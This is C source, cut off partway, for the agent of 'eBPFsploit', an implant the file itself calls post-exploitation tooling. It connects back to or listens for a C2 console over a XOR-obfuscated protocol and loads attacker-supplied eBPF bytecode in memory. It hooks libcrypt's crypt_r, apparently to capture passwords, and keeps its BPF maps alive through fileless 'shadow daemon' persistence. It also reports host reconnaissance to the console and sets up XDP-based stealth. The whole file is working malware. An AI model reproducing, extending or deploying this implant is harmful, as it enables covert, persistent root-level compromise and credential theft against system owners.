#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <arpa/inet.h>
#include <bpf/libbpf.h>
#include <bpf/bpf.h>
#include <linux/bpf.h>
#include <sys/socket.h>
#include <sys/un.h>
#include <fcntl.h>
#include <signal.h>
#include <sys/wait.h>
#include <net/if.h>
#include <ctype.h>
#include <sys/utsname.h>

#define MAGIC            0xDEADBEEF
#define MAX_SESSIONS     32
#define MAX_LINKS        16
#define MAX_MAPS         16
#define SHADOW_MAX_FDS   48

/* ---- Pre-Shared Key (构建时自动替换) ---- */
static const char PSK[] = "__EBPFSPLOIT_PSK__";

/* ---- 命令类型 ---- */
#define CMD_LOAD    4   /* 加载模块 */
#define CMD_UNLOAD  5   /* 热卸载模块 */
#define CMD_LIST    6   /* 查询活跃会话列表 */
#define CMD_UPDATE  7   /* 运行时更新 BPF Map */
#define RESP_MSG    8   /* Agent → Console 响应 */
#define CMD_RECON   9   /* 请求环境侦察信息 */
#define CMD_GET     10  /* 获取 BPF Map 值 */
#define CMD_DUMP_MAP 11 /* 导出整个 BPF Map */

/* ---- 通信协议结构体 ---- */
/* 总大小：4+4+4+4+32+96 = 144 bytes */
struct cmd_payload {
    uint32_t magic;
    uint32_t cmd_type;
    uint32_t session_id;   /* load=0; unload/update=目标id */
    uint32_t data_size;    /* load=BPF字节码大小; update=0 */
    char     aux[32];      /* load=模块名; update=目标map名 */
    char     config[96];   /* load=初始配置; update=[0:key_size]=key,[key_size:]=value */
};

/* ---- 会话注册表 ---- */
struct session {
    uint32_t          id;
    char              name[32];
    int               active;
    struct bpf_object *obj;
    struct bpf_link   *links[MAX_LINKS];
    int               link_count;
    /* Shadow daemon fields */
    pid_t             shadow_pid;
    int               map_fds[MAX_MAPS];
    char              map_names[MAX_MAPS][32];
    int               map_count;
};

static struct session sessions[MAX_SESSIONS];
static uint32_t next_id = 1;

static struct session *alloc_session(void) {
    for (int i = 0; i < MAX_SESSIONS; i++) {
        if (!sessions[i].active) {
            memset(&sessions[i], 0, sizeof(sessions[i]));
            sessions[i].id     = next_id++;
            sessions[i].active = 1;
            return &sessions[i];
        }
    }
    return NULL;
}

static struct session *find_session(uint32_t id) {
    for (int i = 0; i < MAX_SESSIONS; i++)
        if (sessions[i].active && sessions[i].id == id)
            return &sessions[i];
    return NULL;
}

/* XOR 加解密（每条消息独立，key 位置从 0 开始） */
static void xor_crypt(void *data, size_t len) {
    unsigned char *d = (unsigned char *)data;
    size_t psk_len = strlen(PSK);
    if (psk_len == 0) return;
    for (size_t i = 0; i < len; i++)
        d[i] ^= PSK[i % psk_len];
}

/* 发送 JSON 响应（带 4 字节长度前缀，均 XOR 加密） */
void send_resp(int sock, const char *json_str) {
    uint32_t len = strlen(json_str);
    uint32_t enc_len = len;
    xor_crypt(&enc_len, sizeof(enc_len));
    send(sock, &enc_len, sizeof(enc_len), 0);
    char *enc_buf = malloc(len);
    if (!enc_buf) return;
    memcpy(enc_buf, json_str, len);
    xor_crypt(enc_buf, len);
    send(sock, enc_buf, len, 0);
    free(enc_buf);
}

/* ==================== Shadow Daemon Infrastructure ==================== */

/* 影子守护进程通信的元数据结构 */
struct shadow_meta {
    uint32_t session_id;
    char     name[32];
    int      link_count;
    int      map_count;
    char     map_names[MAX_MAPS][32];
};

/* 构造抽象命名空间 socket 地址 (不产生任何磁盘文件) */
static socklen_t make_shadow_addr(struct sockaddr_un *addr, uint32_t sid) {
    memset(addr, 0, sizeof(*addr));
    addr->sun_family = AF_UNIX;
    addr->sun_path[0] = '\0';
    int n = snprintf(addr->sun_path + 1, sizeof(addr->sun_path) - 1, "_kw_%u", sid);
    return offsetof(struct sockaddr_un, sun_path) + 1 + n;
}

/* SCM_RIGHTS: 跨进程发送 FD */
static int send_fds(int sock, struct shadow_meta *meta, int *fds, int num_fds) {
    struct msghdr msg = {0};
    struct iovec iov = { .iov_base = meta, .iov_len = sizeof(*meta) };
    msg.msg_iov = &iov;
    msg.msg_iovlen = 1;
    size_t cmsg_sz = CMSG_SPACE(sizeof(int) * num_fds);
    char *cmsgbuf = calloc(1, cmsg_sz);
    if (!cmsgbuf) return -1;
    msg.msg_control = cmsgbuf;
    msg.msg_controllen = cmsg_sz;
    struct cmsghdr *cmsg = CMSG_FIRSTHDR(&msg);
    cmsg->cmsg_level = SOL_SOCKET;
    cmsg->cmsg_type = SCM_RIGHTS;
    cmsg->cmsg_len = CMSG_LEN(sizeof(int) * num_fds);
    memcpy(CMSG_DATA(cmsg), fds, sizeof(int) * num_fds);
    int ret = sendmsg(sock, &msg, 0);
    free(cmsgbuf);
    return ret;
}

/* SCM_RIGHTS: 跨进程接收 FD */
static int recv_fds(int sock, struct shadow_meta *meta, int *fds, int max_fds) {
    struct msghdr msg = {0};
    struct iovec iov = { .iov_base = meta, .iov_len = sizeof(*meta) };
    msg.msg_iov = &iov;
    msg.msg_iovlen = 1;
    size_t cmsg_sz = CMSG_SPACE(sizeof(int) * max_fds);
    char *cmsgbuf = calloc(1, cmsg_sz);
    if (!cmsgbuf) return -1;
    msg.msg_control = cmsgbuf;
    msg.msg_controllen = cmsg_sz;
    if (recvmsg(sock, &msg, 0) <= 0) { free(cmsgbuf); return -1; }
    struct cmsghdr *cmsg = CMSG_FIRSTHDR(&msg);
    int num = -1;
    if (cmsg && cmsg->cmsg_level == SOL_SOCKET && cmsg->cmsg_type == SCM_RIGHTS) {
        num = (cmsg->cmsg_len - CMSG_LEN(0)) / sizeof(int);
        if (num > max_fds) num = max_fds;
        memcpy(fds, CMSG_DATA(cmsg), num * sizeof(int));
    }
    free(cmsgbuf);
    return num;
}

/* 影子守护进程：抱着 FD 不死，响应新 Agent 的恢复请求 */
static void run_shadow_daemon(struct shadow_meta *meta, int *fds, int num_fds) {
    setsid();
    int null_fd = open("/dev/null", O_RDWR);
    if (null_fd >= 0) {
        dup2(null_fd, STDIN_FILENO);
        dup2(null_fd, STDOUT_FILENO);
        dup2(null_fd, STDERR_FILENO);
        if (null_fd > 2) close(null_fd);
    }
    int listen_fd = socket(AF_UNIX, SOCK_STREAM, 0);
    if (listen_fd < 0) _exit(1);
    struct sockaddr_un addr;
    socklen_t addr_len = make_shadow_addr(&addr, meta->session_id);
    if (bind(listen_fd, (struct sockaddr *)&addr, addr_len) < 0) _exit(1);
    if (listen(listen_fd, 1) < 0) _exit(1);
    signal(SIGTERM, SIG_DFL);
    while (1) {
        int client = accept(listen_fd, NULL, NULL);
        if (client < 0) continue;
        send_fds(client, meta, fds, num_fds);
        close(client);
    }
}

/* 从已有的影子守护进程恢复会话 */
static void recover_from_shadows(void) {
    for (uint32_t sid = 1; sid < 256; sid++) {
        struct sockaddr_un addr;
        socklen_t addr_len = make_shadow_addr(&addr, sid);
        int sock = socket(AF_UNIX, SOCK_STREAM, 0);
        if (sock < 0) continue;
        struct timeval tv = { .tv_sec = 0, .tv_usec = 100000 };
        setsockopt(sock, SOL_SOCKET, SO_RCVTIMEO, &tv, sizeof(tv));
        if (connect(sock, (struct sockaddr *)&addr, addr_len) < 0) {
            close(sock); continue;
        }
        struct shadow_meta meta;
        int fds[SHADOW_MAX_FDS];
        int num = recv_fds(sock, &meta, fds, SHADOW_MAX_FDS);
        /* 获取影子进程的 PID */
        pid_t shadow_pid = 0;
        struct ucred cred;
        socklen_t cred_len = sizeof(cred);
        if (getsockopt(sock, SOL_SOCKET, SO_PEERCRED, &cred, &cred_len) == 0)
            shadow_pid = cred.pid;
        close(sock);
        if (num <= 0) continue;
        struct session *s = NULL;
        for (int i = 0; i < MAX_SESSIONS; i++) {
            if (!sessions[i].active) { s = &sessions[i]; break; }
        }
        if (!s) continue;
        memset(s, 0, sizeof(*s));
        s->id = meta.session_id;
        s->active = 1;
        strncpy(s->name, meta.name, sizeof(s->name) - 1);
        s->link_count = meta.link_count;
        s->obj = NULL;
        s->shadow_pid = shadow_pid;
        s->map_count = meta.map_count > num ? num : meta.map_count;
        for (int i = 0; i < s->map_count; i++) {
            s->map_fds[i] = fds[i];
            strncpy(s->map_names[i], meta.map_names[i], 31);
        }
        if (s->id >= next_id) next_id = s->id + 1;
        printf("[*] Recovered shadow session %u (%s) — %d maps, %d hooks\n",
               s->id, s->name, s->map_count, s->link_count);
    }
}

/* 按 map 名查找 FD (兼容 obj 模式和影子恢复模式) */
static int find_map_fd(struct session *s, const char *map_name,
                       size_t *key_size, size_t *val_size) {
    if (s->obj) {
        struct bpf_map *map = bpf_object__find_map_by_name(s->obj, map_name);
        if (!map) return -1;
        if (key_size) *key_size = bpf_map__key_size(map);
        if (val_size) *val_size = bpf_map__value_size(map);
        return bpf_map__fd(map);
    }
    for (int i = 0; i < s->map_count; i++) {
        if (strcmp(s->map_names[i], map_name) == 0) {
            int fd = s->map_fds[i];
            struct bpf_map_info info = {};
            unsigned int info_len = sizeof(info);
            if (bpf_obj_get_info_by_fd(fd, &info, &info_len) == 0) {
                if (key_size) *key_size = info.key_size;
                if (val_size) *val_size = info.value_size;
            }
            return fd;
        }
    }
    return -1;
}

/* ---- 初始配置：对已知配置 Map（key=0）写入 config 数据 ---- */
static void apply_initial_config(struct bpf_object *obj, const char *config) {
    struct bpf_map *map;
    bpf_object__for_each_map(map, obj) {
        const char *n = bpf_map__name(map);
        /* Array maps used as config slots */
        if (strstr(n, "inject_payload") || strstr(n, "master_password")) {
            int fd = bpf_map__fd(map);
            if (fd >= 0) {
                uint32_t key = 0;
                size_t vsz = bpf_map__value_size(map);
                if (vsz > 96) vsz = 96;
                bpf_map__update_elem(map, &key, sizeof(key), config, vsz, BPF_ANY);
            }
        }
    }
}

/* ---- CMD_LOAD ---- */
static void handle_load(int sock, struct cmd_payload *cmd) {
    if (cmd->data_size == 0) {
        send_resp(sock, "{\"error\":\"data_size=0\"}");
        return;
    }

    unsigned char *buf = malloc(cmd->data_size);
    if (!buf) { send_resp(sock, "{\"error\":\"malloc\"}"); return; }

    if (recv(sock, buf, cmd->data_size, MSG_WAITALL) != (ssize_t)cmd->data_size) {
        free(buf);
        send_resp(sock, "{\"error\":\"recv blob\"}");
        return;
    }
    xor_crypt(buf, cmd->data_size);  /* 解密 BPF 字节码 */

    struct session *s = alloc_session();
    if (!s) {
        free(buf);
        send_resp(sock, "{\"error\":\"max sessions reached\"}");
        return;
    }

    strncpy(s->name, cmd->aux[0] ? cmd->aux : "unknown", 31);

    struct bpf_object *obj = bpf_object__open_mem(buf, cmd->data_size, NULL);
    free(buf); /* libbpf 内部已复制，可安全释放 */

    if (libbpf_get_error(obj)) {
        s->active = 0;
        send_resp(sock, "{\"error\":\"open_mem failed\"}");
        return;
    }

    /* 加载前 patch .data（兼容旧方式） */
    struct bpf_map *data_map = bpf_object__find_map_by_name(obj, ".data");
    if (data_map) {
        size_t msz = bpf_map__value_size(data_map);
        const void *mptr_const = bpf_map__initial_value(data_map, NULL);
        void *mptr = (void *)mptr_const;
        if (mptr && cmd->config[0]) {
            size_t cp = msz < 64 ? msz : 64;
            memcpy(mptr, cmd->config, cp);
        }
    }

    int err = bpf_object__load(obj);
    if (err) {
        bpf_object__close(obj);
        s->active = 0;
        char msg[64];
        snprintf(msg, sizeof(msg), "{\"error\":\"load err %d\"}", err);
        send_resp(sock, msg);
        return;
    }

    /* 对配置 Map 写入初始值（运行时 patch） */
    if (cmd->config[0])
        apply_initial_config(obj, cmd->config);

    /* 挂载所有 BPF 程序，持久化 link */
    struct bpf_program *prog;
    bpf_object__for_each_program(prog, obj) {
        struct bpf_link *lk = NULL;
        enum bpf_prog_type ptype = bpf_program__type(prog);
        const char *sec_name = bpf_program__section_name(prog);

        if (ptype == BPF_PROG_TYPE_XDP) {
            const char *ifname = "eth0";
            if (cmd->config[64])
                ifname = (const char *)&cmd->config[64];
            unsigned int ifidx = if_nametoindex(ifname);
            if (ifidx == 0) {
                printf("[!] XDP: interface '%s' not found, trying eth0\n", ifname);
                ifidx = if_nametoindex("eth0");
            }
            if (ifidx > 0) {
                lk = bpf_program__attach_xdp(prog, ifidx);
                if (!libbpf_get_error(lk))
                    printf("[+] XDP attached to ifindex %u (%s)\n", ifidx, ifname);
            }
        } else if (ptype == BPF_PROG_TYPE_KPROBE && sec_name &&
                   (strstr(sec_name, "uprobe") || strstr(sec_name, "uretprobe"))) {
            /* uprobe/uretprobe 需要指定二进制路径 */
            int is_retprobe = (strstr(sec_name, "uretprobe") != NULL);
            /* 尝试常见的 libcrypt 路径 */
            const char *crypt_paths[] = {
                "/lib/x86_64-linux-gnu/libcrypt.so.1",
                "/lib64/libcrypt.so.1",
                "/lib/libcrypt.so.1",
                "/usr/lib/libcrypt.so.1",
                "/usr/lib/x86_64-linux-gnu/libcrypt.so.1",
                NULL
            };
            const char *lib_path = NULL;
            for (int p = 0; crypt_paths[p]; p++) {
                if (access(crypt_paths[p], F_OK) == 0) {
                    lib_path = crypt_paths[p];
                    break;
                }
            }
            if (lib_path) {
                /* 动态抓取 crypt_r 的偏移量，兼容任意类型的导出符号，以及带版本号的后缀(如 @@XCRYPT_2.0) */
                char nm_cmd[512];
                snprintf(nm_cmd, sizeof(nm_cmd),
                    "nm -D '%s' 2>/dev/null | grep -E ' [a-zA-Z] crypt_r(@@.*)?$' | grep -v ' U ' | head -1 | awk '{print $1}'",
                    lib_path);
                
                size_t func_off = 0;
                FILE *nm_fp = popen(nm_cmd, "r");
                if (nm_fp) {
                    char off_buf[32];
                    if (fgets(off_buf, sizeof(off_buf), nm_fp))
                        func_off = strtoull(off_buf, NULL, 16);
                    pclose(nm_fp);
                }
                
                if (func_off == 0) {
                    printf("[-] Cannot resolve crypt_r() offset in %s\n", lib_path);
                } else {
                    LIBBPF_OPTS(bpf_uprobe_opts, up_opts,
                        .retprobe = is_retprobe,
                    );
                    lk = bpf_program__attach_uprobe_opts(prog, -1, lib_path, func_off, &up_opts);
                    if (!libbpf_get_error(lk))
                        printf("[+] %s attached to %s:crypt_r (offset 0x%lx)\n",
                            is_retprobe ? "uretprobe" : "uprobe", lib_path, func_off);
                    else
                        printf("[-] Failed to attach %s to %s\n",
                            is_retprobe ? "uretprobe" : "uprobe", lib_path);
                }
            } else {
                printf("[-] libcrypt.so.1 not found, uprobe skipped\n");
            }
        } else {
            lk = bpf_program__attach(prog);
        }

        if (lk && !libbpf_get_error(lk) && s->link_count < MAX_LINKS)
            s->links[s->link_count++] = lk;
    }

    s->obj = obj;

    /* ========== Fileless Persistence: Shadow Daemon ========== */
    int all_fds[SHADOW_MAX_FDS];
    int fd_idx = 0;
    struct shadow_meta meta = {
        .session_id = s->id,
        .link_count = s->link_count,
        .map_count = 0
    };
    strncpy(meta.name, s->name, sizeof(meta.name) - 1);

    struct bpf_map *map_iter;
    bpf_object__for_each_map(map_iter, obj) {
        int mfd = bpf_map__fd(map_iter);
        if (mfd >= 0 && fd_idx < SHADOW_MAX_FDS && meta.map_count < MAX_MAPS) {
            all_fds[fd_idx++] = mfd;
            strncpy(meta.map_names[meta.map_count], bpf_map__name(map_iter), 31);
            s->map_fds[meta.map_count] = mfd;
            strncpy(s->map_names[meta.map_count], bpf_map__name(map_iter), 31);
            meta.map_count++;
        }
    }
    s->map_count = meta.map_count;

    pid_t shadow_pid = fork();
    if (shadow_pid == 0) {
        run_shadow_daemon(&meta, all_fds, fd_idx);
        _exit(0);
    } else if (shadow_pid > 0) {
        s->shadow_pid = shadow_pid;
        printf("[+] Shadow Daemon spawned (PID: %d). Fileless persistence achieved.\n", shadow_pid);
    } else {
        printf("[-] Failed to spawn Shadow Daemon.\n");
    }

    char resp[128];
    snprintf(resp, sizeof(resp),
             "{\"ok\":true,\"session_id\":%u,\"name\":\"%s\",\"programs\":%d}",
             s->id, s->name, s->link_count);
    send_resp(sock, resp);
    printf("[+] Module '%s' loaded \xe2\x86\x92 Session %u (%d programs) [FILELESS]\n",
           s->name, s->id, s->link_count);
}

/* ---- CMD_UNLOAD ---- */
static void handle_unload(int sock, struct cmd_payload *cmd) {
    struct session *s = find_session(cmd->session_id);
    if (!s) { send_resp(sock, "{\"error\":\"session not found\"}"); return; }

    /* 杀死影子守护进程 */
    if (s->shadow_pid > 0) {
        kill(s->shadow_pid, SIGKILL);
        waitpid(s->shadow_pid, NULL, 0);
        s->shadow_pid = 0;
    }

    for (int i = 0; i < s->link_count; i++) {
        if (s->links[i]) { bpf_link__destroy(s->links[i]); s->links[i] = NULL; }
    }
    if (s->obj) {
        bpf_object__close(s->obj); s->obj = NULL;
    } else {
        for (int i = 0; i < s->map_count; i++) {
            if (s->map_fds[i] >= 0) close(s->map_fds[i]);
        }
    }

    char resp[128];
    snprintf(resp, sizeof(resp),
             "{\"ok\":true,\"unloaded\":%u,\"name\":\"%s\"}", s->id, s->name);
    printf("[+] Session %u ('%s') unloaded\n", s->id, s->name);
    s->active = 0;
    send_resp(sock, resp);
}

/* ---- CMD_LIST ---- */
static void handle_list(int sock) {
    char resp[1024];
    int  pos = 0;
    pos += snprintf(resp + pos, sizeof(resp) - pos, "{\"sessions\":[");
    int first = 1;
    for (int i = 0; i < MAX_SESSIONS; i++) {
        if (!sessions[i].active) continue;
        char entry[128];
        snprintf(entry, sizeof(entry),
                 "%s{\"id\":%u,\"name\":\"%s\",\"programs\":%d}",
                 first ? "" : ",",
                 sessions[i].id, sessions[i].name, sessions[i].link_count);
        pos += snprintf(resp + pos, sizeof(resp) - pos, "%s", entry);
        first = 0;
    }
    snprintf(resp + pos, sizeof(resp) - pos, "]}");
    send_resp(sock, resp);
}



/* ---- CMD_DUMP_MAP ---- */
static void handle_dump_map(int sock, struct cmd_payload *cmd) {
    struct session *s = find_session(cmd->session_id);
    if (!s) { send_resp(sock, "{\"error\":\"session invalid\"}"); return; }

    const char *map_name = (char *)cmd->aux;
    size_t key_size = 0, val_size = 0;
    int fd = find_map_fd(s, map_name, &key_size, &val_size);

    if (fd < 0 || key_size == 0 || val_size == 0 || key_size > 256 || val_size > 256) {
        send_resp(sock, "{\"error\":\"invalid map meta for dump\"}");
        return;
    }

    uint8_t key[256], next_key[256], val[256];
    memset(key, 0, sizeof(key));
    memset(next_key, 0, sizeof(next_key));

    char resp[8192];
    int pos = snprintf(resp, sizeof(resp), "{\"ok\":true,\"map\":\"%s\",\"entries\":[", map_name);
    int first = 1;

    int err = bpf_map_get_next_key(fd, NULL, next_key);
    while (err == 0 && pos < sizeof(resp) - 1024) {
        if (bpf_map_lookup_elem(fd, next_key, val) == 0) {
            pos += snprintf(resp + pos, sizeof(resp) - pos, "%s{\"k\":\"", first ? "" : ",");
            for (size_t i = 0; i < key_size; i++) pos += snprintf(resp + pos, sizeof(resp) - pos, "%02x", next_key[i]);
            pos += snprintf(resp + pos, sizeof(resp) - pos, "\",\"v\":\"");
            for (size_t i = 0; i < val_size; i++) pos += snprintf(resp + pos, sizeof(resp) - pos, "%02x", val[i]);
            pos += snprintf(resp + pos, sizeof(resp) - pos, "\"}");
            first = 0;
        }
        memcpy(key, next_key, key_size);
        err = bpf_map_get_next_key(fd, key, next_key);
    }
    snprintf(resp + pos, sizeof(resp) - pos, "]}");
    send_resp(sock, resp);
}

/* ---- CMD_GET ---- */
/*
 * config 布局：
 *   [0 : key_size)  = map key  (原始字节，小端)
 *   [key_size : 96) = map value (原始字节)
 *
 * key_size 由 BPF map 元数据自动获取，无需协议方显式携带。
 */
static void handle_get(int sock, struct cmd_payload *cmd) {
    struct session *s = find_session(cmd->session_id);
    if (!s) { send_resp(sock, "{\"error\":\"session invalid\"}"); return; }

    const char *map_name = (char *)cmd->aux;
    size_t key_size = 0, val_size = 0;
    int fd = find_map_fd(s, map_name, &key_size, &val_size);

    if (fd < 0 || key_size == 0 || val_size == 0 || val_size > 256) {
        send_resp(sock, "{\"error\":\"invalid map meta for get\"}");
        return;
    }

    void *key_ptr = cmd->config;
    uint8_t val_buf[256];
    memset(val_buf, 0, sizeof(val_buf));

    int err = bpf_map_lookup_elem(fd, key_ptr, val_buf);
    if (err) {
        char msg[64];
        snprintf(msg, sizeof(msg), "{\"error\":\"lookup_elem %d\"}", err);
        send_resp(sock, msg);
        return;
    }

    char hex_val[512];
    for (size_t i = 0; i < val_size; i++)
        sprintf(hex_val + i * 2, "%02x", val_buf[i]);
    hex_val[val_size * 2] = '\0';

    char resp[1024];
    snprintf(resp, sizeof(resp),
             "{\"ok\":true,\"session\":%u,\"map\":\"%s\",\"value_hex\":\"%s\"}",
             s->id, map_name, hex_val);
    send_resp(sock, resp);
}

/* ---- CMD_UPDATE ---- */
/*
 * config 布局：
 *   [0 : key_size)  = map key  (原始字节，小端)
 *   [key_size : 96) = map value (原始字节)
 *
 * key_size 由 BPF map 元数据自动获取，无需协议方显式携带。
 */
static void handle_update(int sock, struct cmd_payload *cmd) {
    struct session *s = find_session(cmd->session_id);
    if (!s) { send_resp(sock, "{\"error\":\"session invalid\"}"); return; }

    const char *map_name = cmd->aux;
    size_t key_size = 0, val_size = 0;
    int fd = find_map_fd(s, map_name, &key_size, &val_size);

    if (fd < 0 || key_size == 0 || key_size > 8) {
        send_resp(sock, "{\"error\":\"invalid map meta or not found\"}");
        return;
    }

    void *key_ptr = cmd->config;
    void *val_ptr = cmd->config + key_size;

    int err = bpf_map_update_elem(fd, key_ptr, val_ptr, BPF_ANY);
    if (err) {
        char msg[64];
        snprintf(msg, sizeof(msg), "{\"error\":\"update_elem %d\"}", err);
        send_resp(sock, msg);
        return;
    }

    char resp[128];
    snprintf(resp, sizeof(resp),
             "{\"ok\":true,\"session\":%u,\"map\":\"%s\"}", s->id, map_name);
    send_resp(sock, resp);
}

/* ---- CMD_RECON: 环境侦察 ---- */
static int file_exists(const char *path) { return access(path, F_OK) == 0; }
static int file_readable(const char *path) { return access(path, R_OK) == 0; }

static int check_cap(int cap_id) {
    /* 简单检查：读取 /proc/self/status 中 CapEff 位 */
    FILE *fp = fopen("/proc/self/status", "r");
    if (!fp) return 0;
    char line[256];
    unsigned long long cap_eff = 0;
    while (fgets(line, sizeof(line), fp)) {
        if (sscanf(line, "CapEff:\t%llx", &cap_eff) == 1) break;
    }
    fclose(fp);
    return (cap_eff & (1ULL << cap_id)) != 0;
}

static void read_lsm_list(char *buf, size_t sz) {
    buf[0] = '\0';
    FILE *fp = fopen("/sys/kernel/security/lsm", "r");
    if (fp) {
        if (fgets(buf, sz, fp)) {
            /* 去除换行 */
            char *nl = strchr(buf, '\n');
            if (nl) *nl = '\0';
        }
        fclose(fp);
    }
}

static void handle_recon(int sock) {
    struct utsname un;
    uname(&un);

    int is_root        = (getuid() == 0);
    int cap_bpf        = check_cap(39);  /* CAP_BPF */
    int cap_sys_admin  = check_cap(21);  /* CAP_SYS_ADMIN */
    int cap_mac_admin  = check_cap(33);  /* CAP_MAC_ADMIN */
    int cap_net_admin  = check_cap(12);  /* CAP_NET_ADMIN */
    int has_bpf_fs     = file_exists("/sys/fs/bpf");
    int has_btf        = file_exists("/sys/kernel/btf/vmlinux");
    int has_tracefs    = file_exists("/sys/kernel/debug/tracing") ||
                         file_exists("/sys/kernel/tracing");
    int has_uprobe     = file_exists("/sys/kernel/debug/tracing/uprobe_events") ||
                         file_exists("/sys/kernel/tracing/uprobe_events");
    int has_kprobe     = file_exists("/sys/kernel/debug/tracing/kprobe_events") ||
                         file_exists("/sys/kernel/tracing/kprobe_events");
    int has_xdp        = cap_net_admin || cap_sys_admin; /* XDP 需要网络权限 */

    char lsm_list[256] = "";
    read_lsm_list(lsm_list, sizeof(lsm_list));
    int has_lsm_bpf = (strstr(lsm_list, "bpf") != NULL);

    int has_probe_write = file_readable("/proc/sys/kernel/unprivileged_bpf_disabled");

    char resp[1024];
    snprintf(resp, sizeof(resp),
        "{"
        "\"recon\":{"
          "\"kernel\":\"%s %s\","
          "\"arch\":\"%s\","
          "\"hostname\":\"%s\","
          "\"is_root\":%d,"
          "\"caps\":{"
            "\"bpf\":%d,"
            "\"sys_admin\":%d,"
            "\"mac_admin\":%d,"
            "\"net_admin\":%d"
          "},"
          "\"features\":{"
            "\"bpf_fs\":%d,"
            "\"btf\":%d,"
            "\"tracefs\":%d,"
            "\"uprobe\":%d,"
            "\"kprobe\":%d,"
            "\"xdp\":%d,"
            "\"lsm_bpf\":%d,"
            "\"probe_write\":%d"
          "},"
          "\"lsm_modules\":\"%s\""
        "}"
        "}",
        un.sysname, un.release, un.machine, un.nodename,
        is_root,
        cap_bpf, cap_sys_admin, cap_mac_admin, cap_net_admin,
        has_bpf_fs, has_btf, has_tracefs, has_uprobe, has_kprobe,
        has_xdp, has_lsm_bpf, has_probe_write,
        lsm_list
    );
    send_resp(sock, resp);
    printf("[+] Recon data sent to console\n");
}

/* ================================================================ */
static void print_help(const char *prog) {
    printf(
        "\n"
        "  ╔═══════════════════════════════════════════════════╗\n"
        "  ║                Agent  —  eBPFsploit               ║\n"
        "  ║    Kernel-level eBPF implant for post-exploit     ║\n"
        "  ╚═══════════════════════════════════════════════════╝\n"
        "\n"
        "  USAGE:\n"
        "    %s [OPTIONS]\n"
        "\n"
        "  CONNECTION MODES:\n"
        "    -b <PORT>             Bind mode: listen on <PORT>, wait for console\n"
        "    -r <IP> <PORT>        Reverse mode: connect back to console at <IP>:<PORT>\n"
        "\n"
        "  STEALTH:\n"
        "    -i <IFACE>            Enable XDP stealth on <IFACE> (requires root + CAP_NET_ADMIN)\n"
        "                          Without -i, XDP stealth is disabled\n"
        "\n"
        "  OTHER OPTIONS:\n"
        "    -h, --help            Show this help message and exit\n"
        "\n"
        "  EXAMPLES:\n"
        "    %s -b 4444            Bind — agent listens on 0.0.0.0:4444\n"
        "    %s -r 10.0.0.1 4444   Reverse — agent connects to 10.0.0.1:4444\n"
        "\n"
        "  PROTOCOL:\n"
        "    144-byte command packets. Supported commands:\n"
        "      CMD_LOAD   (4)  — Load and attach an eBPF module\n"
        "      CMD_UNLOAD (5)  — Detach and destroy a running module\n"
        "      CMD_LIST   (6)  — List all active sessions\n"
        "      CMD_UPDATE (7)  — Update a BPF map in a running module\n"
        "\n"
        "  NOTES:\n"
        "    - Requires root privileges (CAP_BPF + CAP_SYS_ADMIN)\n"
        "    - Max concurrent sessions: %d\n"
        "    - Reverse mode auto-reconnects on disconnect (5s interval)\n"
        "\n",
        prog, prog, prog, MAX_SESSIONS
    );
}

/* 处理单个连接上的命令循环 */
static void handle_connection(int c_sock) {
    printf("[+] Console connected\n");
    struct cmd_payload cmd;
    while (recv(c_sock, &cmd, sizeof(cmd), MSG_WAITALL) == sizeof(cmd)) {
        xor_crypt(&cmd, sizeof(cmd));  /* 解密命令包 */
        if (cmd.magic != MAGIC) continue;
        switch (cmd.cmd_type) {
            case CMD_LOAD:   handle_load(c_sock, &cmd);   break;
            case CMD_UNLOAD: handle_unload(c_sock, &cmd); break;
            case CMD_LIST:   handle_list(c_sock);          break;
            case CMD_UPDATE: handle_update(c_sock, &cmd); break;
            case CMD_RECON:  handle_recon(c_sock);         break;
            case CMD_GET:    handle_get(c_sock, &cmd);     break;
            case CMD_DUMP_MAP: handle_dump_map(c_sock, &cmd); break;
            default:
                printf("[!] Unknown cmd_type=%u\n", cmd.cmd_type);
        }
    }
    printf("[-] Console disconnected\n");
    close(c_sock);
}

/* Bind 模式：监听端口，等待 Console 连接 */
static int run_bind(int port) {
    int l_sock = socket(AF_INET, SOCK_STREAM, 0);
    if (l_sock < 0) { perror("socket"); return 1; }

    int opt = 1;
    setsockopt(l_sock, SOL_SOCKET, SO_REUSEADDR, &opt, sizeof(opt));

    struct sockaddr_in addr = {
        .sin_family      = AF_INET,
        .sin_port        = htons(port),
        .sin_addr.s_addr = INADDR_ANY
    };
    if (bind(l_sock, (struct sockaddr *)&addr, sizeof(addr)) < 0) {
        perror("bind"); return 1;
    }
    if (listen(l_sock, 1) < 0) { perror("listen"); return 1; }

    printf("[+] Ouroboros Agent AWAKE — Bind mode on port %d\n", port);

    while (1) {
        int c_sock = accept(l_sock, NULL, NULL);
        if (c_sock < 0) { perror("accept"); continue; }
        handle_connection(c_sock);
    }
    return 0;
}

/* Reverse 模式：主动回连 Console，断线自动重连 */
static int run_reverse(const char *host, int port) {
    printf("[+] Ouroboros Agent AWAKE — Reverse mode → %s:%d\n", host, port);

    while (1) {
        int sock = socket(AF_INET, SOCK_STREAM, 0);
        if (sock < 0) { perror("socket"); sleep(5); continue; }

        struct sockaddr_in addr = {
            .sin_family = AF_INET,
            .sin_port   = htons(port),
        };
        if (inet_pton(AF_INET, host, &addr.sin_addr) <= 0) {
            fprintf(stderr, "[-] Invalid IP: %s\n", host);
            close(sock);
            return 1;
        }

        printf("[*] Connecting to %s:%d...\n", host, port);
        if (connect(sock, (struct sockaddr *)&addr, sizeof(addr)) < 0) {
            perror("[-] Connect failed, retrying in 5s");
            close(sock);
            sleep(5);
            continue;
        }

        handle_connection(sock);
        printf("[*] Reconnecting in 5s...\n");
        sleep(5);
    }
    return 0;
}

/* ---- XDP 自动隐身：Agent 启动时加载 stealth_link.bpf.o ---- */
static struct bpf_object *stealth_obj = NULL;
static struct bpf_link   *stealth_link = NULL;

/* 自动检测默认路由网卡名 */
static const char *detect_default_iface(void) {
    static char iface[32] = "eth0";
    FILE *fp = fopen("/proc/net/route", "r");
    if (!fp) return iface;
    char line[256];
    fgets(line, sizeof(line), fp); /* 跳过表头 */
    while (fgets(line, sizeof(line), fp)) {
        char name[32];
        unsigned long dest;
        if (sscanf(line, "%31s %lx", name, &dest) == 2 && dest == 0) {
            strncpy(iface, name, sizeof(iface) - 1);
            break;
        }
    }
    fclose(fp);
    return iface;
}

static void auto_load_stealth(int c2_port, const char *ifname) {
    if (!ifname) {
        printf("[*] XDP stealth: no interface specified (-i), skipping\n");
        return;
    }

    /* 权限检查 */
    if (getuid() != 0) {
        printf("[*] XDP stealth: not root, skipping\n");
        return;
